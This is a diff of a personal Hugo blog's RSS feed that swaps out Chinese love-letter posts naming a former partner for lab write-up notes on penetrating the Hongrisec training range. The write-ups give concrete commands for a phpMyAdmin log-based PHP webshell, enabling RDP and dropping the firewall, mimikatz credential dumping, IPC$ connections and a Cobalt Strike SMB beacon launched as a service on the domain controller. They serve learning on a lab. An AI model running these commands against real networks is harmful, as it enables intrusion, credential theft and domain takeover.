@@ -1,171 +1,176 @@
 <rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
     <channel>
-        <title>Hzj 爱 Lxj</title>
+        <title>黄泽杰Ekko</title>
         <link>http://sxzl798.github.io/</link>
-        <description>my favorite lover</description>
-        <generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Sun, 06 Oct 2024 19:12:02 &#43;0800</lastBuildDate>
+        <description>Ekko</description>
+        <generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Thu, 10 Oct 2024 11:35:24 &#43;0800</lastBuildDate>
             <atom:link href="http://sxzl798.github.io/index.xml" rel="self" type="application/rss+xml" />
         <item>
-    <title>一、其实忘不了，放不下，只是算了</title>
-    <link>http://sxzl798.github.io/posts/%E4%B8%80%E5%85%B6%E5%AE%9E%E5%BF%98%E4%B8%8D%E4%BA%86%E6%94%BE%E4%B8%8D%E4%B8%8B%E5%8F%AA%E6%98%AF%E7%AE%97%E4%BA%86/</link>
-    <pubDate>Sun, 06 Oct 2024 19:12:02 &#43;0800</pubDate>
+    <title>Part10.使用CS自带的SMB Beacon上线内网域控主机（内网穿透）</title>
+    <link>http://sxzl798.github.io/posts/hongrisec_1/12.p29media-note-%E4%BD%BF%E7%94%A8cs%E8%87%AA%E5%B8%A6smb-beacon%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8/</link>
+    <pubDate>Thu, 10 Oct 2024 11:35:24 &#43;0800</pubDate>
     <author>黄泽杰</author>
-    <guid>http://sxzl798.github.io/posts/%E4%B8%80%E5%85%B6%E5%AE%9E%E5%BF%98%E4%B8%8D%E4%BA%86%E6%94%BE%E4%B8%8D%E4%B8%8B%E5%8F%AA%E6%98%AF%E7%AE%97%E4%BA%86/</guid>
-    <description><![CDATA[我也不想一直打电话给你，每次打电话给你你没接，我会慌，每一个打不进去你手机的电话都是我失眠的晚上
-我知道你是因为生我气而不接，而我会因为你不接电话生气，这样分手后依然是互相生闷气
-我也想忘掉那些回忆，从第一次分手开始，那些美好的过去，跟现在的现实做对比，实在残忍
-哪怕你不接，但我习惯打电话给你，和你闲聊，或者什么都不说都好
-因为这种行为已经刻在我身体里，是那几年每天一个电话养成的习惯
-我克制了很久，不去联系你，但是依然做不到
-你说我不早来找你，但你连电话都不肯接，你怎么会见我，若你愿意接电话，我又何必不打招呼就来到你家
-我很想跟你说我不爱你，但是实在违心，我怎么能不爱你
-你伤我，我最多生气
-我不请自来，是因为我不想欺骗自己
-我的本心依然忘不了你，也放不下你，也不去想代价是什么]]></description>
+    <guid>http://sxzl798.github.io/posts/hongrisec_1/12.p29media-note-%E4%BD%BF%E7%94%A8cs%E8%87%AA%E5%B8%A6smb-beacon%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8/</guid>
+    <description><![CDATA[Part10.使用CS自带的SMB Beacon上线内网域控主机（内网穿透） 在web服务器和域控之间建立流量隧道 为什么建立了ipc通道还要建立流量隧道
+因为ipc只能传文件，不能传流量
+SMB Beacon简介: SMB Beacon使用命名管道通过父级Beacon进行通讯
+当两个Beacons连接后，子Beacon从父Beacon获取到任务并发送
+使用CS工具中的SMB Beacon 使用SMB 新建一个监听器，用作smb隧道 明确总体思路：
+在cs上生成smb木马 通过AntSword上传文件到web服务器 web服务器通过ipc管道将木马文件上传到域控主机 域控主机执行文件，与web服务器建立smb隧道 流量再通过web服务器回到cs 上传smb木马到web服务器
+通过ipc管道上传文件到域控主机
+shell copy smb_beacon.exe \\192.168.52.138\C$ 通过ipc管道在域控主机下创建一个服务，执行木马
+shell sc \\owa.god.org create test binpath= &#34;cmd.exe /c c:\smb_beacon.exe&#34; 开启服务
+shell sc \\owa.god.org start test 域控启动smb服务，web服务器也要发送连接命令，才能建立smb隧道
+link owa.god.org 哪怕报1053错误，也可以link到，接下来成功上线
+上线成功，拿到owa，system权限]]></description>
 </item>
 <item>
-    <title>二、如果离开我你过得更好的话...</title>
-    <link>http://sxzl798.github.io/posts/%E4%BA%8C%E5%A6%82%E6%9E%9C%E7%A6%BB%E5%BC%80%E6%88%91%E4%BD%A0%E8%BF%87%E5%BE%97%E6%9B%B4%E5%A5%BD%E7%9A%84%E8%AF%9D/</link>
-    <pubDate>Sun, 06 Oct 2024 19:11:53 &#43;0800</pubDate>
+    <title>Part8.AntSword到Cobalt Strike的迁移上线</title>
+    <link>http://sxzl798.github.io/posts/hongrisec_1/10.p27media-note-%E8%9A%81%E5%89%91%E5%88%B0cs%E7%9A%84%E8%BF%81%E7%A7%BB%E4%B8%8A%E7%BA%BF/</link>
+    <pubDate>Thu, 10 Oct 2024 11:35:24 &#43;0800</pubDate>
     <author>黄泽杰</author>
-    <guid>http://sxzl798.github.io/posts/%E4%BA%8C%E5%A6%82%E6%9E%9C%E7%A6%BB%E5%BC%80%E6%88%91%E4%BD%A0%E8%BF%87%E5%BE%97%E6%9B%B4%E5%A5%BD%E7%9A%84%E8%AF%9D/</guid>
-    <description><![CDATA[你问我是不是想复合，我说不想是假的，但说想又会引起你的排斥
-你说你离开我之后过的更好，其实无论我放不放的下，我都已经想放手了
-如果事实如你所说，离开我更快乐更幸福，那我就彻底离开吧
-手写的笔记本就让它尘封吧，它已经没必要交到你的手上
-过去我的真心所想，连同那些秘密，随着时间过去，其实也不重要了
-希望你放下，不要因为我流眼泪，你为我流的泪也是我心里的一道道痕
-我们都很痛苦，已经到了麻木的地步
-今年体检我已经患了轻度抑郁，伴随着一点心梗，我的身体不如以前健康了
-时间真的很残忍，我后悔没能把握那些时间，没能一直做好你的老大
-你说的那些画饼，其实我是玩笑中说着认真的话
-它们都需要时间去验证，过个十年我会证明给你看
-也确实如你所说，我没能好好注意你的感受和那些节日，那些细节
-我没能平衡工作和生活，渐渐疏远了你，那些都是我失职的地方
-那些是我没抓住的时间，对不起]]></description>
+    <guid>http://sxzl798.github.io/posts/hongrisec_1/10.p27media-note-%E8%9A%81%E5%89%91%E5%88%B0cs%E7%9A%84%E8%BF%81%E7%A7%BB%E4%B8%8A%E7%BA%BF/</guid>
+    <description><![CDATA[Part8.AntSword到Cobalt Strike的迁移上线 内网渗透 为什么需要Cobalt Strike工具
+因为虽然Webshell管理工具也可以执行命令，但是在一些操作上实受限的，比如想提权，想扫描想横向，想代理都是不方便的
+所以接下来就要使用CS或者MSF工具
+MSF——命令操作 CS——图形操作
+安装Cobalt Strike工具 第一步：需要jdk1.8环境 第二步：打开cs： 管理员权限进入到目标目录下 ip应该选192.168.111.1，这样服务器端web才能ping通
+使用Cobalt Strike工具 生成后的后门木马文件放在本地文件夹中，然后再通过AntSword上传文件到服务器，接着在AntSword终端上运行此文件 这时候，cs这里已经上线了 在这个输入框中可以执行系统命令]]></description>
 </item>
 <item>
-    <title>三、只属于你的特殊礼物</title>
-    <link>http://sxzl798.github.io/posts/%E4%B8%89%E5%8F%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E7%89%B9%E6%AE%8A%E7%A4%BC%E7%89%A9/</link>
-    <pubDate>Sun, 06 Oct 2024 19:11:42 &#43;0800</pubDate>
+    <title>Part9.内网横向移动——ipc管道</title>
+    <link>http://sxzl798.github.io/posts/hongrisec_1/11.p28media-note-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%8A%80%E5%B7%A7%E4%B9%8Bipc%E7%AE%A1%E9%81%93/</link>
+    <pubDate>Thu, 10 Oct 2024 11:35:24 &#43;0800</pubDate>
     <author>黄泽杰</author>
-    <guid>http://sxzl798.github.io/posts/%E4%B8%89%E5%8F%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E7%89%B9%E6%AE%8A%E7%A4%BC%E7%89%A9/</guid>
-    <description><![CDATA[大部分情侣过节都会送花送礼
-我自认为是一只特立独行的猪，我不想送那些普遍的礼物给独特的你
-在我心里，我们这一对是最独特的一对
-我没有多少经济实力，我喜欢把心意藏在不起眼的礼物里
-那只怀表，分针秒针在我的头像上转动，是希望你的时光里一分一秒都有我伴随
-我们在一起的最后一个你的生日，我送了一本书，书里其实是我对我们未来爱情的期待
-我喜欢把心意藏在喻象之中，我不想你轻易知道，希望你能慢慢参透
-这是我设置的把戏，因为我的梦想职业是导演，我喜欢留彩蛋而不剧透
-我想这些心意在长时间的储藏后，变成我老了之后跟你讲的故事
-当然，前提是如果我们的感情能经过时间的考验的话]]></description>
+    <guid>http://sxzl798.github.io/posts/hongrisec_1/11.p28media-note-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%8A%80%E5%B7%A7%E4%B9%8Bipc%E7%AE%A1%E9%81%93/</guid>
+    <description><![CDATA[Part9.内网横向移动——ipc管道 内网横向移动 横向移动（lateralmovement）已成为现如今网络需要留意的主要威胁之一
+成功的横向移动攻击可以使攻击者闯入用户现有系统，并访问系统资源
+高级持续性威胁（APT）是横向移动带来的最常见网络攻击类型
+如果网络有足够多未保护的漏洞，只要有足够的时间，黑客最终就可以访问域控制器本身
+横向移动就是通过一台电脑从而控制公司的整个电脑
+横向移动的方式众多：
+利用远控工具横向 IPCS横向移动 PTH哈希传递攻击 PTK秘钥传递攻击 PTT票据传递攻击 PSexec工具横向移动 SMB工具横向移动 WinRM命令横向 WMI命令横向移动 横向移动——ipc$ IPC(InternetProcessConnection)共享&quot;命名管道&quot;的资源，是为了实现进程间通信而开放的命名管道
+PC可以通过验证用户名和密码获得相应的权限 通常在远程管理计算机和查看计算机的共享资源时使用 通过ipc$可以与目标机器建立连接 利用这个连接,不仅可以访问目标机器中的文件，进行上传、下载等操作
+还可以在目标机器上运行其他命令以获取标机器的目录结构、用户列表等信息
+直接用cs工具读取域控账号密码 执行建立ipc命令
+shell net use \\192.168.52.138\ipc$ &#34;hongrisec@2020&#34; /user:god\administrator 这里显示这台web服务器和域控主机已经建立了ipc管道，我们用以下命令验证一下
+shell net use 确定web服务器和域控主机已经建立了ipc管道
+由于内网中的域控主机是不连接互联网的，所以我们的渗透电脑是没办法进入对方的网段中的
+所以只能通过内网代理解决这个问题
+接下来建立隧道，让web服务器成为跳板]]></description>
 </item>
 <item>
-    <title>四、如果再来一次</title>
-    <link>http://sxzl798.github.io/posts/%E5%9B%9B%E5%A6%82%E6%9E%9C%E5%86%8D%E6%9D%A5%E4%B8%80%E6%AC%A1/</link>
-    <pubDate>Sun, 06 Oct 2024 19:11:32 &#43;0800</pubDate>
+    <title>Part1.入侵企业的网络思路</title>
+    <link>http://sxzl798.github.io/posts/hongrisec_1/1.p17-%E5%85%A5%E4%BE%B5%E4%BC%81%E4%B8%9A%E7%9A%84%E7%BD%91%E7%BB%9C%E6%80%9D%E8%B7%AF-%E9%85%8D%E7%BD%AEweb%E6%9C%8D%E5%8A%A1%E5%99%A8/</link>
+    <pubDate>Thu, 10 Oct 2024 11:34:24 &#43;0800</pubDate>
     <author>黄泽杰</author>
-    <guid>http://sxzl798.github.io/posts/%E5%9B%9B%E5%A6%82%E6%9E%9C%E5%86%8D%E6%9D%A5%E4%B8%80%E6%AC%A1/</guid>
-    <description><![CDATA[那些不找你的时间，不是不想你
-是怕影响你想要的重新开始，我无数次想要和你进行交流
-我有很好的口才，明明可以油嘴滑舌交很多伴侣
-但是专一是一件更酷的事情，也是这个时代珍贵的品质，我不愿意舍弃它
-第一次分手后 ，你和另一个人在一起，那是我第一次严肃的怀疑我的爱情观
-也是我第一次想要删除所有和你相关的记忆，甚至尽量避免去东莞
-如果说第一次分手前我对你是百分百的付出
-那么在第一次分手后的复合，我已经开始小心翼翼的从百分之十，慢慢到百分之八十
-但始终无法百分百的付出给你，这是我的心理阴影
-因为我不想再一次强迫自己删除一次记忆，就像生命中的一部分被抽离一样，那是极端痛苦的体验
-这是我对你说，我后来没有像原来一样对你那么用心的解释
-当然，如今，我重新树立了我的爱情认识
-如果再来一次，我会付出百分百，无论是否被辜负
-因为如果不百分百付出，藏有私心，那还会出现我们现在的错误]]></description>
+    <guid>http://sxzl798.github.io/posts/hongrisec_1/1.p17-%E5%85%A5%E4%BE%B5%E4%BC%81%E4%B8%9A%E7%9A%84%E7%BD%91%E7%BB%9C%E6%80%9D%E8%B7%AF-%E9%85%8D%E7%BD%AEweb%E6%9C%8D%E5%8A%A1%E5%99%A8/</guid>
+    <description><![CDATA[Part1.入侵企业的网络思路 靶场介绍 本次渗透的靶场是红日安全团队的1号靶场，该靶场包含1台连接公网的web服务器，配置有双网卡，对应的ip地址分别为192.168.111.128和192.168.52.143，网段111的连接外网，网段52的连接内网，内网共有2台主机，1台域控和1台域内机器，ip地址分别为192.168.52.138和192.168.52.141
+该靶场模拟了一般情况下企业的网络配置，非常具有代表性
+红队攻击思路概括 通过对这个企业级靶场的渗透，我们将完整的走一遍渗透链，从web服务器入侵到内网渗透]]></description>
 </item>
 <item>
-    <title>五、最好的年纪，最好的你</title>
-    <link>http://sxzl798.github.io/posts/%E4%BA%94%E6%9C%80%E5%A5%BD%E7%9A%84%E5%B9%B4%E7%BA%AA%E6%9C%80%E5%A5%BD%E7%9A%84%E4%BD%A0/</link>
-    <pubDate>Sun, 06 Oct 2024 19:11:20 &#43;0800</pubDate>
+    <title>Part2.控制192.168.111.128电脑</title>
+    <link>http://sxzl798.github.io/posts/hongrisec_1/4.p21-%E6%89%93%E7%82%B9%E6%8A%80%E6%9C%AF%E5%92%8C%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</link>
+    <pubDate>Thu, 10 Oct 2024 11:34:24 &#43;0800</pubDate>
     <author>黄泽杰</author>
-    <guid>http://sxzl798.github.io/posts/%E4%BA%94%E6%9C%80%E5%A5%BD%E7%9A%84%E5%B9%B4%E7%BA%AA%E6%9C%80%E5%A5%BD%E7%9A%84%E4%BD%A0/</guid>
-    <description><![CDATA[这是我的后悔，后悔我没有做到百分百付出，出现对你的懈怠和不用心
-很爱你却又怕你伤害我，是一种长期存在于我心中的矛盾
-那时的我，很想像以前一样给你百分百的体贴和照顾，生怕你感到委屈
-却又怕再一次被你耍，被一个认识不到一个月的男生横刀夺爱
-为了自我保护，所以我藏着对你的温柔，对你的爱意
-甚至对你凶狠，对你露出爪牙，现在想想，其实那恰恰是我的保护色
-是我的脆弱造就了我的凶狠
-勇敢的爱应该是百分百的，可惜我现在才明白这个道理
-我还有复合的心，并不是想重蹈覆辙，是我想卸下过去所有的伪装和保护色
-接受所有以前发生的事，像我们第一次在一起那样毫无保留的再爱一遍
-因为我知道未来的我明白再多的道理，谈再多的感情，也完全不敌我们最初在一起的一天
-那是最纯真的爱情，那是毫无保留，没有杂念，纯粹的爱情
-我心里删除再多记忆，也不愿意删除那一段最美好的记忆，那是没有杂质的纯洁的爱
-我心里还留存那一份爱，只有你在身边的时候才能回味
-这是你永远无法被他人替代的根本，并不是所谓的外在等等
-所以我才会和你开外在的玩笑，因为和那一份真爱相比，完全不可敌
-在这个意义层面上讲，以后的每一任其实都无法再超过你，因为我们的回忆只属于我们]]></description>
+    <guid>http://sxzl798.github.io/posts/hongrisec_1/4.p21-%E6%89%93%E7%82%B9%E6%8A%80%E6%9C%AF%E5%92%8C%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</guid>
+    <description><![CDATA[Part2.控制192.168.111.128电脑 信息收集 端口：不同的端口对应不同的服务，不同的服务有着不同的攻击方式 web渗透通常来说就是找网站的相关漏洞，然后通过漏洞给服务器植入木马，从而拿到主机的控制权 手段如下 sql注入 RCE 文件上传 XXE XSS 找漏洞有两种方式 逐个测试
+找特征然后搜索历史漏洞 先使用nmap扫描ip地址，扫出这个ip地址开放给互联网哪些端口，从以上nmap扫出的结果可以看到这台web服务器的80和3306端口是开放的，80端口就是浏览器可以访问的端口，3306是数据库开放的端口
+80端口攻击思路 针对80端口，我们想知道这个ip地址的浏览器上能有哪些地址可以访问，这时候就可以使用dirsearch扫描目录，从而获取所有可以访问的浏览器地址，再从浏览器开放的信息中去寻找漏洞 漏洞可以针对浏览器暴露的建站服务器或工具去网页进行搜索，得到对应的攻击手段 ]]></description>
 </item>
 <item>
-    <title>六、你是上天给我的礼物</title>
-    <link>http://sxzl798.github.io/posts/%E5%85%AD%E4%BD%A0%E6%98%AF%E4%B8%8A%E5%A4%A9%E7%BB%99%E6%88%91%E7%9A%84%E7%A4%BC%E7%89%A9/</link>
-    <pubDate>Sun, 06 Oct 2024 19:11:09 &#43;0800</pubDate>
+    <title>Part3.对目标web服务器进行目录扫描和密码爆破</title>
+    <link>http://sxzl798.github.io/posts/hongrisec_1/5.p23-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</link>
+    <pubDate>Thu, 10 Oct 2024 11:34:24 &#43;0800</pubDate>
     <author>黄泽杰</author>
-    <guid>http://sxzl798.github.io/posts/%E5%85%AD%E4%BD%A0%E6%98%AF%E4%B8%8A%E5%A4%A9%E7%BB%99%E6%88%91%E7%9A%84%E7%A4%BC%E7%89%A9/</guid>
-    <description><![CDATA[刘晓均，排除亲人在外，你实在是目前为止于我而言最重要的一个人
-离开了你，还总能想起你，哪怕压制住自己的冲动，也无可避免的想起你
-无论你做了多过分的事，说了多过分的话
-见面我还是忍不住摸你的头，轻抚你的头发，还是想握住你的手，看着你的眼睛，触碰你的鼻子
-这个时候，其他的一切都无关紧要了
-我也不知道为什么，你总能做到这一切
-除了你之外，没有人可以做到，这是最奇妙的地方
-也是我今天特意想来验证的一件事，是否断绝联系一年，还能发生这种奇迹
-确实，意料之中，奇迹依然发生
-或者说，你就是安排给我的奇迹
-p8.png]]></description>
+    <guid>http://sxzl798.github.io/posts/hongrisec_1/5.p23-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</guid>
+    <description><![CDATA[Part3.对目标web服务器进行目录扫描和密码爆破 使用dirsearch工具进行目录扫描 因为通过前面的nmap端口扫描，我们已经发现了80端口是开放的，所以我们就可以接着使用dirsearch工具对这个ip地址网站进行目录扫描，看看哪些网站可以登录
+针对phpMyAdmin网站进行密码爆破 这里的index.php网站登录进去可以知道这个这个网站是php探针，针对这个网站，我们就可以进行phpadmin爆破
+将网址保存到txt文件中，再通过导入网址，读取txt，就可以进行密码爆破，这里爆破成功的是root，root
+这样我们就成功登录服务器后台
+通过mysql命令更改日志，植入木马 之后我们就可以进行日志中放木马的方式去控制这个主机
+所以，首先我们要查询到日志文件的位置
+这里可以发现这个系统日志是关闭的
+将日志文件设置为自己创建的文件
+再查看一下是否更改成功
+已经成功
+在日志中写入木马 select &#39;&lt;?php eval($ POST[1]); ?&gt;&#39;; 这句话是一句话木马
+在mysql中运行，就会被记录在日志里
+代码审计，打开web服务器文件查看
+接下来如何控制别人电脑呢？
+可以根据web服务器使用的编程语言和框架选择性地使用以下工具：
+AntSword（php） 哥斯拉（php，java） 冰蝎（java） ]]></description>
 </item>
 <item>
-    <title>七、爱是感觉</title>
-    <link>http://sxzl798.github.io/posts/%E4%B8%83%E7%88%B1%E6%98%AF%E6%84%9F%E8%A7%89/</link>
-    <pubDate>Sun, 06 Oct 2024 19:10:54 &#43;0800</pubDate>
+    <title>Part4.通过getshell方式修改全局日志，进而控制目标web服务器</title>
+    <link>http://sxzl798.github.io/posts/hongrisec_1/6.p23media-note-phpmyadmin%E5%85%A8%E5%B1%80%E6%97%A5%E5%BF%97-getshell/</link>
+    <pubDate>Thu, 10 Oct 2024 11:34:24 &#43;0800</pubDate>
     <author>黄泽杰</author>
-    <guid>http://sxzl798.github.io/posts/%E4%B8%83%E7%88%B1%E6%98%AF%E6%84%9F%E8%A7%89/</guid>
-    <description><![CDATA[千万别觉得我冒犯，我并不是想通过这些动作勾起你的感觉
-我是想直面我的感觉，因为感觉不会骗人，语言也无法描述
-只有见一面才能知道，这是电话里短信里做不到的
-眼神与眼神的交流，呼吸的此起彼伏，手握着手的触觉
-是是否还有爱的感觉的绝对验证]]></description>
+    <guid>http://sxzl798.github.io/posts/hongrisec_1/6.p23media-note-phpmyadmin%E5%85%A8%E5%B1%80%E6%97%A5%E5%BF%97-getshell/</guid>
+    <description><![CDATA[Part4.通过getshell方式修改全局日志，进而控制目标web服务器 渗透工具的选择 针对不同后端编程语言的服务器，有不同的找漏洞方式，从而选择正确的工具
+在此，我们可以使用Wappalyzer来看目前网站所使用的技术栈 根据所得信息，确定该web服务器使用phpMyAdmin框架，决定使用AntSword工具进行渗透
+蚁剑的安装和使用 首先，去github里面下载这两个文件，一个是文件的核心，另一个是文件的启动器 接着，打开启动器exe，第一次启动要选择初始化目录，就选择那个核心文件夹 接着再次打开蚁剑： 这里的网址就填写我们之前新建的baili.php文件 密码就是之前写的一句话木马中POST中的数字 此时右键这个连接，就可以看到我们能进行的操作 双击进去，实际上可以控制这台主机的文件了 但是这样还不够，最好从虚拟终端去控制这台电脑 可以看到这是域管理员账号名 总结，通过以上操作，我们拿到了该web服务器的域账号名和主机账号名]]></description>
 </item>
 <item>
-    <title>八、没有你的记忆是不完整的我</title>
-    <link>http://sxzl798.github.io/posts/%E5%85%AB%E6%B2%A1%E6%9C%89%E4%BD%A0%E7%9A%84%E8%AE%B0%E5%BF%86%E6%98%AF%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%9A%84%E6%88%91/</link>
-    <pubDate>Sun, 06 Oct 2024 19:10:33 &#43;0800</pubDate>
+    <title>Part5.远程开启3389端口，接管目标主机的控制权</title>
+    <link>http://sxzl798.github.io/posts/hongrisec_1/7.p24media-note-%E8%BF%9C%E7%A8%8B%E5%BC%80%E5%90%AF3389%E6%8E%A7%E5%88%B6%E7%94%B5%E8%84%91/</link>
+    <pubDate>Thu, 10 Oct 2024 11:34:24 &#43;0800</pubDate>
     <author>黄泽杰</author>
-    <guid>http://sxzl798.github.io/posts/%E5%85%AB%E6%B2%A1%E6%9C%89%E4%BD%A0%E7%9A%84%E8%AE%B0%E5%BF%86%E6%98%AF%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%9A%84%E6%88%91/</guid>
-    <description><![CDATA[也不知道你会不会看这些信息，我想说的其实还有很多很多
-我憋了太久太久，过去一年里我无数次逼着自己封锁这些想法，这些感知，就装作一切都没发生过
-让自己成为一个简单的物质的生物，尝试让自己变得肤浅，不要想那么多，不要感觉到那么多，不然要疯掉了
-但是，伪装始终是伪装，逃避始终是逃避，掩盖也始终是掩盖
-我不想成为一个不完整的黄泽杰，完整的黄泽杰应该拥有所有的记忆，无论是好的坏的
-所以，今天，我也是来恢复记忆的，我去了我们以前所有去过的地方，走过的路\
-躲过雨的屋檐，踩过水的石板，我生怕错过任何一处刻上我们回忆的地方
-写下这些能让我感到真实的自己，能和亲历的你分享这些，我真的很高兴]]></description>
+    <guid>http://sxzl798.github.io/posts/hongrisec_1/7.p24media-note-%E8%BF%9C%E7%A8%8B%E5%BC%80%E5%90%AF3389%E6%8E%A7%E5%88%B6%E7%94%B5%E8%84%91/</guid>
+    <description><![CDATA[Part5.远程开启3389端口，接管目标主机的控制权 使用蚁剑远程桌面控制对方主机的思路 首先，要远程控制目标主机，需要达成2个条件：
+目标主机需要开启3389端口 拿到目标主机登录所需的账号密码 打开目标主机3389端口 使用命令查看该主机开放的端口
+netstat -ano 发现目标主机本身没有开启3389端口
+使用这条命令打开3389端口
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /Ff 3389端口打开成功
+再用这条命令关闭主机防火墙
+查看防火墙状态
+netsh firewall show state 显示操作模式，禁用，表示防火墙已关闭
+验证是否可以远程连接桌面 现在已经完成3389端口的打开，还差获取对方这个主机用户的密码
+获取主机用户密码 利用Mimikatz去调取操作系统的less内存
+github下载猕猴桃工具
+再通过蚁剑上传到目标web服务器
+接着在命令行中运行以下命令
+mimikatz.exe &#34;privilege::debug&#34; &#34;sekurlsa::logonPasswords&#34; &#34;exit&#34; 拿到关键信息：
+用户名：god\Administrator 密码：hongrisec@2019 远程桌面登录成功，等同拿到该web服务器的最高控制权
+接下来需要做到权限维持，也就是留后门 之前我们经过了信息收集，漏洞挖掘，跳过了提权获取到该主机的最高权限
+现在，问题就在于如何维持这个权限，而不会被人发现木马而修复漏洞导致我们无法登录]]></description>
 </item>
 <item>
-    <title>九、我们是地球上的两个外星人</title>
-    <link>http://sxzl798.github.io/posts/%E4%B9%9D%E6%88%91%E4%BB%AC%E6%98%AF%E5%9C%B0%E7%90%83%E4%B8%8A%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%A4%96%E6%98%9F%E4%BA%BA/</link>
-    <pubDate>Sun, 06 Oct 2024 19:09:48 &#43;0800</pubDate>
+    <title>Part6.内网靶场的调试与安装</title>
+    <link>http://sxzl798.github.io/posts/hongrisec_1/8.p25media-note-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E7%9A%84%E8%B0%83%E8%AF%95%E5%92%8C%E5%AE%89%E8%A3%85/</link>
+    <pubDate>Thu, 10 Oct 2024 11:34:24 &#43;0800</pubDate>
     <author>黄泽杰</author>
-    <guid>http://sxzl798.github.io/posts/%E4%B9%9D%E6%88%91%E4%BB%AC%E6%98%AF%E5%9C%B0%E7%90%83%E4%B8%8A%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%A4%96%E6%98%9F%E4%BA%BA/</guid>
-    <description><![CDATA[今天，我感觉我生命中丢失的那一块隐隐约约又回来了
-在跟你见面的那一分钟就回来了
-在这个地方，见你一面，是很神圣的一件事
-可转念一想，如果有一天，你不在这个世界上了
-这些生命的碎片就永远找不回了，我会永远失去这一块美好的生命
-想到这，我又很沮丧
-这个世界上，我真的再也找不到一个能互相倾诉这些回忆的人了
-没有人会听我滔滔不绝讲和你的故事，只有你能明白
-我们就像地球上的两个外星人，有我们专属的语言]]></description>
+    <guid>http://sxzl798.github.io/posts/hongrisec_1/8.p25media-note-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E7%9A%84%E8%B0%83%E8%AF%95%E5%92%8C%E5%AE%89%E8%A3%85/</guid>
+    <description><![CDATA[Part6.内网靶场的调试与安装 设置dns服务器地址 web服务器的dns要改为域控主机的ip地址
+目前的密码是：
+web服务器：hongri@2020 域控主机：hongri@2024 域内主机：hongri@2020
+检查域内主机 域内主机的dns默认已经是域控主机的ip地址
+00:08:32
+net user 查询用户
+domain 向域控询问
+一共5个域账号 如果web服务器显示出这5个账号，说明该服务器主机已经加入该域中，所以可以提出假设，域内主机一定也能查出这5个账号 验证 内网渗透 内网渗透的第一步，是内网信息收集
+systeminfo 当前web服务器主机名为STU1，域账号为Administrator 域为god.org]]></description>
+</item>
+<item>
+    <title>Part7.内网信息收集和定位域控和域内主机</title>
+    <link>http://sxzl798.github.io/posts/hongrisec_1/9.p26media-note-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%92%8C%E5%AE%9A%E4%BD%8D%E6%9C%BA%E5%99%A8/</link>
+    <pubDate>Thu, 10 Oct 2024 11:34:24 &#43;0800</pubDate>
+    <author>黄泽杰</author>
+    <guid>http://sxzl798.github.io/posts/hongrisec_1/9.p26media-note-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%92%8C%E5%AE%9A%E4%BD%8D%E6%9C%BA%E5%99%A8/</guid>
+    <description><![CDATA[Part7.内网信息收集和定位域控和域内主机 查询该域下的账户和主机数量（查不到域控） 查询该域下有多少账户 net user /domain 查询该域下有多少主机 net group &#34;domain computers&#34; /domain 可以看到有3台主机，对应web服务器，域控，域内主机
+根据域内的账户和主机进行初步判断 该主机名为STU1 该账户名为Administrator 该域下有5个账户 域名为god.org 该域下有3台主机 STU1(web服务器，已被控制) DEV1 ROOT-TVI862UBEH 查找这个域的域控信息 找到域控的ip
+nslookup -type=SRV _ldap._tcp 域控的IP地址：192.168.52.138 域控的全名：owa.god.org（owa就是这个域控的机器名，god.org是域名)
+通过已经控制的web服务器，找到域所在的网段，进而判断域内主机的基本情况 查看web服务器的IP
+ipconfig 公网：192.168.111.128
+内网：192.168.52.143
+可以看到有两个网卡，本地网络的是web服务器本身的IP地址，是连接公网的，所以52.143可以初步判断为连接内网的网卡
+使用以下命令查看52网段下存在的机器
+arp -a 52网段下存在1台52.138，52.138刚好对应上面扫出的域控
+同时，在最开始，我们已经扫出三台主机和一台域控主机
+STU1(web服务器，已被控制) DEV1 ROOT-TVI862UBEH owa ping一下3台主机 + 域控主机，同时将主机名和ip地址对应上
+STU1是本服务器，对应192.168.111.128
+DEV1主机要么不存在，要么已关机 ROOT-TVI862UBEH主机，对应192.168.52.141 owa域控机，对应192.168.52.138 总结信息： 192.168.111.128 STU1（外网：已控制的服务器） 192.168.52.138 owa（内网：域控） 192.168.52.141 ROOT-TVI862UBEH（内网：域内主机） 目标： 渗透进入192.168.52.138 owa（内网：域控）]]></description>
 </item>
 </channel>
 </rss>
